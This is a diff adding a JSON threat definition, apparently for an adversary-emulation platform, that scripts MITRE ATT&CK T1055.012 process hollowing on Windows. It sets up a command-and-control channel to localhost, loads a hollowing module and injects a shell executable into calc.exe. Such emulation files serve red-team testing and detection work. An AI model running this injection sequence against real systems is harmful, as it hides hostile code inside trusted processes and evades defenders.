@@ -1,0 +1,43 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "T1055.012 - Process Injection: Process Hollowing",
+        "display_name": "T1055_012-Process_Hollowing",
+        "name": "T1055_012-Process_Hollowing",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":10}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "scythe.phollowing",
+                "request": "--load scythe.phollowing",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "d94e3d40-2790-11ec-85ac-4ff6483a0164",
+                "module": "scythe.phollowing",
+                "request": "--src VFS:/shared/unicorn_shell.exe --target C:\\Windows\\System32\\calc.exe",
+                "rtags": [
+                    "att&ck-technique:T1055.012"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
